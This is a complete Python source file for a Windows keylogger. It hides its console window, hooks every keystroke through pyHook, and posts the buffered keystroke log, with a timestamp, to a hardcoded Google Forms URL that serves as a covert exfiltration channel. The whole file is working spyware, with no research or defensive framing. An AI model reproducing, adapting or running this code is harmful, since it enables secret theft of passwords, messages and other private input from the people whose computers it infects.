import pyHook
import pythoncom
import win32console, win32gui
import urllib.parse
import urllib.request
import datetime

#Hide the Console
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

#Initialize the log as a blank string
data=''

#Write function to write logs to text file
def LogNow():
    global data
    if len(data) > 100:
        data = str(datetime.datetime.now())+" : " +data
        url = "https://docs.google.com/forms/d/e/1FAIpQLSeZDjalqbMkiobv96KIQePCBhzsGHnM80FfRsZVqI4W3iGhrw/formResponse"  # Specify Google Form URL here
        klog = {'entry.930665253': data}  # Specify the Field Name here
        try:
            dataenc = urllib.parse.urlencode(klog)
            dataenc = dataenc.encode('ascii')
            req = urllib.request.Request(url, dataenc)
            response = urllib.request.urlopen(req)
            data = ''
        except Exception as e:
            print(e)

    return True

#Trigger the keypress event
def keypressed(event):
    global x, data
    if event.Ascii == 13:
        keys = '<ENTER>'
    elif event.Ascii == 8:
        keys = '<BACK SPACE>'
    elif event.Ascii == 9:
        keys = '<TAB>'
    else:
        keys = chr(event.KeyID)
    data = data + keys
    LogNow()
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = keypressed
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
